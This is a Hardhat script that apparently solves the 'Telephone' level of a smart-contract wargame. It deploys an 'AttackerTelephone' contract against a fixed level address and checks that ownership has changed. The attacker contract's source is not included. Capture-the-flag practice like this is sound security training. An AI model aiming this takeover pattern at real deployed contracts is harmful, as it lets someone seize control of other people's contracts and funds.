const hre = require("hardhat");
async function main() {
    
    const account = await hre.ethers.getSigner();
    console.log(`Working with account ${account.address}`);
    levelAddress = "0x5C949F8E748486CE575390094F177F20B605d712";
    const Level = await hre.ethers.getContractFactory("Telephone");
    const level = await Level.attach(levelAddress);
    console.log(`Level at address ${levelAddress}`);
    const Attacker = await hre.ethers.getContractFactory("AttackerTelephone");
    const attacker = await Attacker.deploy(levelAddress);
    console.log(`Attacker at ${attacker.address}`);

    let tx = await attacker.attack(account.address);
    let tr = await tx.wait();
    console.log(await level.owner());

    
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
